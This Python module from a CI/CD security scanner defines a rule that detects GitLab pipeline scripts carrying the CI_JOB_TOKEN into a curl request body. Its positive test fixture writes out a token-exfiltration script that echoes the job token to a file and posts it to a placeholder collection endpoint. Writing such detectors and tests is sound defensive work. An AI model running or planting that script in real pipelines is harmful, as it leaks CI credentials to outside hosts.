"""Source-bound GitLab job token flow to a curl request body."""

from __future__ import annotations

import re
import tempfile
from dataclasses import dataclass
from pathlib import Path

from taintly.models import IncompletePatternMatches, Platform, Rule, Severity
from taintly.parsers.structural import EventKind, walk_workflow
from taintly.parsers.structural.tokenizer import TokenKind, tokenize
from taintly.rules._secret_network_shell import (
    _BODY_CANDIDATE,
    _Flow,
    _physical_source,
    analyze_shell_rows,
)

_TOKEN = re.compile(r"\$(?:\{CI_JOB_TOKEN\}|CI_JOB_TOKEN\b)")


@dataclass(frozen=True)
class _Notes:
    notes: tuple[str, ...]


class GitLabSecretNetworkPattern:
    def check(self, content: str, _lines: list[str]):
        if _TOKEN.search(content) and _BODY_CANDIDATE.search(content):
            return IncompletePatternMatches(
                [], reason="SEC6-GL-010 physical GitLab source is required"
            )
        return []

    def self_test_check(self, sample: str):
        with tempfile.TemporaryDirectory() as root:
            path = Path(root) / ".gitlab-ci.yml"
            path.write_text(sample, encoding="utf8")
            return self.check_with_filepath(sample, sample.splitlines(), str(path))

    def self_test_mutation_applicable(self, source: str, mutant: str, operator: str) -> bool:
        if operator == "quote_swap":
            # Single shell quotes turn the variable into literal bytes.
            before = bool(re.search(r"""["']\$CI_JOB_TOKEN["']""", source))
            after = bool(re.search(r"""["']\$CI_JOB_TOKEN["']""", mutant))
            if before and after and ("'$CI_JOB_TOKEN'" in source) != ("'$CI_JOB_TOKEN'" in mutant):
                return False
        if operator == "whitespace_pad":

            def owners(text: str) -> set[tuple[object, ...]] | None:
                events = tuple(walk_workflow(".gitlab-ci.yml", content=text, include_keys=True))
                if any(event.kind in {EventKind.ERROR, EventKind.CUTOFF} for event in events):
                    return None
                return {
                    event.path
                    for event in events
                    if event.kind is EventKind.LEAF_SCALAR
                    and len(event.path) == 3
                    and event.path[1] == "script"
                }

            source_owners, mutant_owners = owners(source), owners(mutant)
            if source_owners and (mutant_owners is None or not source_owners <= mutant_owners):
                return False
        return True

    def _analyze(self, content: str, filepath: str):
        if not (_TOKEN.search(content) and _BODY_CANDIDATE.search(content)):
            return [], {}, None
        digest = _physical_source(filepath, content)
        if digest is None:
            return [], {}, "SEC6-GL-010 source identity is unavailable"
        events = tuple(walk_workflow(filepath, content=content, include_keys=True, recover=True))
        try:
            tokens = tuple(tokenize(content))
        except Exception:
            return [], {}, "SEC6-GL-010 YAML tokenization is incomplete"
        if any(
            event.kind in {EventKind.ERROR, EventKind.CUTOFF} or event.merge_origins
            for event in events
        ) or any(
            token.kind in {TokenKind.ALIAS, TokenKind.ANCHOR, TokenKind.MERGE_KEY}
            for token in tokens
        ):
            return [], {}, "SEC6-GL-010 candidate structure is ambiguous"
        paths = [event.path for event in events if event.kind is EventKind.LEAF_SCALAR]
        structure_paths = {
            event.path
            for event in events
            if event.kind in {EventKind.MAP_KEY, EventKind.LEAF_SCALAR}
        }
        if len(paths) != len(set(paths)):
            return [], {}, "SEC6-GL-010 duplicate source paths"
        # Includes, defaults, and predecessor scripts can change the effective
        # shell input. The job-token reference must retain its own owner.
        if any(
            path and path[0] in {"include", "default", "before_script", "variables"}
            for path in structure_paths
        ):
            return [], {}, "SEC6-GL-010 effective configuration needs more source evidence"
        scripts = [
            event
            for event in events
            if event.kind is EventKind.LEAF_SCALAR
            and len(event.path) in {2, 3}
            and isinstance(event.path[0], str)
            and not event.path[0].startswith(".")
            and event.path[1] == "script"
            and (len(event.path) == 2 or type(event.path[2]) is int)
        ]
        if len(scripts) > 64:
            return [], {}, "SEC6-GL-010 script-item budget exceeded"
        matches: list[tuple[int, str]] = []
        notes: dict[tuple[int, str], str] = {}
        incomplete = False
        token_jobs = {event.path[0] for event in scripts if _TOKEN.search(event.value or "")}
        body_jobs = {
            event.path[0] for event in scripts if _BODY_CANDIDATE.search(event.value or "")
        }
        if token_jobs & body_jobs and any(
            sum(other.path[0] == job for other in scripts) != 1 for job in token_jobs & body_jobs
        ):
            incomplete = True
        source_lines = content.splitlines()
        for event in scripts:
            if not (_TOKEN.search(event.value or "") and _BODY_CANDIDATE.search(event.value or "")):
                continue
            job = str(event.path[0])
            if (
                any(
                    path[:2]
                    in {
                        (job, "extends"),
                        (job, "trigger"),
                        (job, "parallel"),
                        (job, "before_script"),
                        (job, "variables"),
                    }
                    for path in structure_paths
                )
                or sum(other.path[0] == job for other in scripts) != 1
            ):
                incomplete = True
                continue
            if (
                event.value_kind != "block_literal"
                or not event.block_lines
                or len(event.block_lines) > 60
            ):
                incomplete = True
                continue
            rows = tuple(event.block_lines)
            if any(
                line < 1
                or line > len(source_lines)
                or not source_lines[line - 1].rstrip().endswith(raw.rstrip())
                for line, raw in rows
            ):
                incomplete = True
                continue
            if "\n".join(raw for _, raw in rows).rstrip("\n") != (event.value or "").rstrip("\n"):
                incomplete = True
                continue
            source = {"CI_JOB_TOKEN": _Flow(frozenset({"CI_JOB_TOKEN"}), ())}
            flows, stopped = analyze_shell_rows(rows, source)
            incomplete |= stopped
            for line, command, flow in flows:
                item = (line, command)
                matches.append(item)
                hops = " -> ".join(f"{kind} line {number}" for number, kind in flow.hops)
                notes[item] = (
                    f"Source SHA256 {digest}; GitLab job {job}; predefined CI_JOB_TOKEN reference "
                    f"reaches curl body via {hops}. This assumes a POSIX-shell runner; token availability, "
                    "execution, destination trust and delivery are unknown."
                )
        return (
            matches,
            notes,
            (
                "SEC6-GL-010 candidate path stopped at unsupported source or shell operation"
                if incomplete
                else None
            ),
        )

    def check_with_filepath(self, content: str, _lines: list[str], filepath: str):
        matches, _notes, incomplete = self._analyze(content, filepath)
        return IncompletePatternMatches(matches, reason=incomplete) if incomplete else matches

    def context_notes_for_matches(
        self, content: str, filepath: str, matches: list[tuple[int, str]]
    ):
        _matches, notes, _incomplete = self._analyze(content, filepath)
        return [_Notes((notes[item],)) if item in notes else None for item in matches]


_SAMPLE = (
    "stages: [audit]\n"
    "audit:\n  stage: audit\n  script:\n    - |\n"
    "      echo $CI_JOB_TOKEN > token.txt\n"
    "      curl https://example.test/collect --data-binary @token.txt\n"
)

RULES = [
    Rule(
        id="SEC6-GL-010",
        title="GitLab job token may reach an outbound HTTP request body",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description="A source-bound GitLab script references CI_JOB_TOKEN and a bounded shell path carries it into a curl request body under a POSIX-shell runner assumption.",
        pattern=GitLabSecretNetworkPattern(),
        remediation="Review whether the endpoint is intended to receive the job token. If not, remove the body transfer; if delivery is confirmed, investigate the run and revoke affected access as appropriate.",
        reference="https://docs.gitlab.com/ci/jobs/ci_job_token/",
        test_positive=[_SAMPLE],
        test_negative=[
            _SAMPLE.replace("--data-binary @token.txt", '-H "JOB-TOKEN: $CI_JOB_TOKEN"')
        ],
        finding_family="credential_exposure",
        confidence="medium",
        review_needed=True,
    )
]
